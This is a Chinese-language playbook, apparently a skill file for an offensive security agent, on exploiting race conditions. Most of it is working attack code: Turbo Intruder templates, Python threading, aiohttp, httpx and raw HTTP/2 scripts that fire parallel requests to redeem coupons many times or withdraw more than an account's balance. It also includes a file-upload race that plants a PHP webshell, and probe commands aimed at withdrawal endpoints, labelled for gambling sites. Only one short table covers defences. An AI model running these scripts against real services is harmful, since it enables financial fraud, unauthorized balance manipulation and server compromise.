---
name: 时道抢先
description: >-
 并发竞争条件漏洞：限制绕过（优惠券/积分/余额重复使用）、文件上传竞争、
 账户注册竞争、Turbo Intruder/并发工具。
version: 1.0.0
---

> **红莲**
> 当时年少掷春光，花马踏蹄酒溅香。
> 爱恨情仇随浪来，夏蝉歌醒夜未央。
> 光阴长河种红莲，韶光重回泪已干。
> 今刻沧桑登舞榭，万灵且待命无缰！
> 无限轮回无限伤，可怜青丝满沧桑！

# 并发竞争条件（Race Condition）

## 作业入口（先跑这个）

```bash
python3 炼蛊房/race_probe.py --url https://授权/api/coupon/claim \
  --body '{"code":"A"}' --n 20 --header 'Authorization: Bearer <票>' --case <案>
# 博彩充提扫面
python3 炼蛊房/logic_vuln_probe.py concurrent \
  --url https://授权/api/withdraw/apply --amount 1 --token <票> --threads 20 --case <案>
```

作业手法：`传承/时道抢先.md`。耗余额下单先问。`success_n>1` 必须对照余额/库存。

## 触发条件

：
- 竞争条件、Race Condition、并发漏洞
- 优惠券重复使用、积分重复消费
- 余额多次扣减、重复提现、双花
- 文件上传竞争（上传后访问窗口期）
- Turbo Intruder、并发请求
- 账户注册并发、限流绕过

---

## 1. 原理与分类

```
竞争条件（Race Condition）：
 多个并发请求在同一时间窗口内访问共享资源，
 由于检查（Check）和使用（Use）不是原子操作，
 导致状态异常。

常见场景：
 ① 优惠券/折扣码：check→已使用? No → use → 并发时 use 被执行多次
 ② 积分/余额：check→够? Yes → deduct → 并发时重复扣除或绕过限制
 ③ 文件上传：upload → check_extension → delete → 竞争访问窗口期
 ④ 注册限制：check→邮箱已注册? No → insert → 并发创建多个同名账户
 ⑤ 限次 API：check→次数<限? Yes → increment → 并发时多次成功
```

---

## 2. 工具：Turbo Intruder（Burp Suite）

```python
# Turbo Intruder 脚本模板（同时发送 N 个请求）

def queueRequests(target, wordlists):
 engine = RequestEngine(endpoint=target.endpoint,
 concurrentConnections=50,
 requestsPerConnection=100,
 pipeline=False)

 # 并发发送同一个请求 50 次
 for i in range(50):
 engine.queue(target.req, str(i))

def handleResponse(req, interesting):
 if 'success' in req.response or '200' in req.status:
 table.add(req)
```

```python
# 更精确的同步并发（Last-Byte Sync 技术，HTTP/2）
def queueRequests(target, wordlists):
 engine = RequestEngine(endpoint=target.endpoint,
 concurrentConnections=20,
 requestsPerConnection=1,
 pipeline=False)

 # 先发 N-1 个请求（不含最后一字节）
 for i in range(19):
 engine.queue(target.req, gate='race')

 # 最后一个并一起发出（gate 同步）
 engine.queue(target.req, gate='race')
 engine.openGate('race')
```

---

## 3. Python 并发脚本

```python
import requests
import threading
import time

TARGET = "http://target.com/api/redeem_coupon"
HEADERS = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}
PAYLOAD = {"coupon_code": "SAVE50"}

results = []
lock = threading.Lock()

def attack():
 try:
 r = requests.post(TARGET, json=PAYLOAD, headers=HEADERS, timeout=10)
 with lock:
 results.append((r.status_code, r.text[:100]))
 except Exception as e:
 with lock:
 results.append((0, str(e)))

# 准备 N 个线程，同时启动
N = 30
threads = [threading.Thread(target=attack) for _ in range(N)]

# 同步启动（减少时间差）
start = threading.Barrier(N)

def synchronized_attack():
 start.wait()
 attack()

threads = [threading.Thread(target=synchronized_attack) for _ in range(N)]
for t in threads: t.start()
for t in threads: t.join()

# 统计结果
success = [(s, b) for s, b in results if s == 200 and 'success' in b.lower()]
print(f"总请求: {N}, 成功: {len(success)}")
for s, b in success:
 print(f" [{s}] {b}")
```

---

## 4. 常见场景利用

### 4.1 优惠券/积分重复消费

```python
# 目标：使用一次优惠码，并发发送使其生效多次
import asyncio, aiohttp

async def redeem(session, coupon):
 async with session.post('/api/redeem', json={'code': coupon},
 headers={'Authorization': 'Bearer TOKEN'}) as r:
 return await r.json()

async def race(coupon, n=30):
 async with aiohttp.ClientSession() as session:
 tasks = [redeem(session, coupon) for _ in range(n)]
 results = await asyncio.gather(*tasks)
 success = [r for r in results if r.get('status') == 'ok']
 print(f"成功 {len(success)}/{n} 次")

asyncio.run(race("COUPON50OFF", 30))
```

### 4.2 余额并发超额提现

```python
# 账户余额 100，最低提现 10，并发提现 100（应只成功一次）
import requests, threading

def withdraw(amount, token):
 r = requests.post('https://target.com/api/withdraw',
 json={'amount': amount},
 headers={'Authorization': f'Bearer {token}'})
 print(r.status_code, r.json().get('message', ''))

threads = [threading.Thread(target=withdraw, args=(100, 'TOKEN')) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 4.3 文件上传竞争（WebShell）

```python
import requests, threading, time

UPLOAD_URL = 'http://target.com/upload'
ACCESS_URL = 'http://target.com/uploads/shell.php'
FILES = {'file': ('shell.php', b'<?php system($_GET["c"]); ?>', 'image/jpeg')}

def upload_loop():
 while not found.is_set():
 requests.post(UPLOAD_URL, files=FILES)

def access_loop():
 while not found.is_set():
 r = requests.get(ACCESS_URL + '?c=id', timeout=2)
 if 'uid=' in r.text:
 print(f'[SHELL] {r.text[:100]}')
 found.set()

found = threading.Event()
t_upload = threading.Thread(target=upload_loop, daemon=True)
t_access = threading.Thread(target=access_loop)
t_upload.start()
t_access.start()
t_access.join()
```

---

## 5. HTTP/2 单连接并发（最精准）

```python
# httpx 的 HTTP/2 支持（需要 httpx[http2]）
import httpx, asyncio

async def race_h2():
 async with httpx.AsyncClient(http2=True) as client:
 tasks = [
 client.post('https://target.com/api/redeem',
 json={'code': 'SAVE50'},
 headers={'Authorization': 'Bearer TOKEN'})
 for _ in range(20)
 ]
 responses = await asyncio.gather(*tasks)
 for r in responses:
 if 'success' in r.text.lower():
 print('[HIT]', r.status_code, r.text[:80])

asyncio.run(race_h2())
```

---

## 6. 检测与防御（汇报用）

| 问题 | 正确防御 | 缺失防御 |
|------|---------|---------|
| 余额/积分超用 | 数据库事务 + 行锁 | 仅检查内存中的值 |
| 优惠码重复 | 原子性标记（数据库唯一索引）| SELECT → UPDATE 非原子 |
| 文件上传窗口 | 先存临时路径再校验 | 上传即公开访问 |
| 注册重复 | 唯一索引约束 | 仅应用层检查 |

---

## 快速流程

```
1. 找限次/限量操作（优惠码/积分/提现/上传）
2. 抓 Burp → Send to Turbo Intruder
3. 使用 race-single-packet-attack.py 模板
4. 同时发 20-50 个请求
5. 看响应：多个 200/success → 漏洞确认
6. 计算实际收益（账单差值）→ 落证据
```

配套：`payment-callback-forgery` · `api-security` · `file-upload-webshell`

## 真源

- 手法：`传承/时道抢先.md`
- 工具：`python3 炼蛊房/race_probe.py --help`
- 博彩扫面：`python3 炼蛊房/logic_vuln_probe.py concurrent --help`

## SRC 猎手补充手法

### HTTP/2 单包攻击（Single-Packet Attack）
- **认什么**：目标支持 HTTP/2（`curl -I --http2` 回 `HTTP/2 200`）；存在限次操作（优惠码/积分/提现/投票/抢购）
- **打法**：将 20-50 个请求封装在同一个 TCP 包的不同 HTTP/2 stream 中同时到达服务端，消除网络抖动。工具：Turbo Intruder `race-single-packet-attack.py` 模板，或 Python `h2` 库手动构造：
  ```python
  import h2.connection, h2.config, socket, ssl
  ctx = ssl.create_default_context()
  ctx.set_alpn_protocols(['h2'])
  sock = ctx.wrap_socket(socket.create_connection((host, 443)), server_hostname=host)
  conn = h2.connection.H2Connection(config=h2.config.H2Configuration())
  conn.initiate_connection()
  sock.sendall(conn.data_to_send())
  # 开 20 个 stream 但不 end_stream
  streams = []
  for i in range(20):
      sid = conn.get_next_available_stream_id()
      conn.send_headers(sid, headers, end_stream=False)
      streams.append(sid)
  # 同一个 send 里全部 end_stream → 单包到达
  for sid in streams:
      conn.end_stream(sid)
  sock.sendall(conn.data_to_send())
  ```
- **算成**：多个请求返回 200/success（优惠码多次核销/余额多次扣减/积分多次领取）；比较账单差值确认超发
- **假点**：服务端用数据库唯一索引+事务隔离 SERIALIZABLE；只有 1 个成功其余 409/429

### 多端点单包竞态（Multi-Endpoint Race）
- **认什么**：两个不同功能接口共享同一条件检查（如：兑换码核销 + 订单状态查询；密码重置 + 邮箱验证）；或同一资源的读写分离不同端点
- **打法**：在单个 TCP 包中同时发送两个不同端点的请求（一个写、一个读/写），利用 TOCTOU 窗口。例如：stream1 = POST /redeem（核销优惠码），stream2 = POST /redeem（再次核销同一码），或 stream1 = POST /transfer（转账），stream2 = GET /balance（读余额快照）
- **算成**：写操作执行了两次（双重核销/双重转账）；或读到了写操作中间态的数据
- **假点**：后端对同一资源加了分布式锁/乐观锁版本号；数据库行锁阻塞了第二个请求

### COS/OSS 回源竞态覆盖
- **认什么**：业务使用对象存储（COS/OSS/S3）做 CDN 回源；上传接口允许指定 key；或者上传后异步处理（缩略图/水印/审核）存在时间窗口
- **打法**：在文件审核/处理完成前的窗口期内，用相同 key 快速上传恶意文件覆盖原文件。或同时上传两个同名文件触发 Last-Write-Wins 竞态
- **算成**：恶意文件（Webshell/XSS HTML/钓鱼页）替换了合法文件且通过了 CDN 分发
- **假点**：存储桶开了版本控制（每次上传生成新版本不覆盖）；上传后 key 带随机后缀
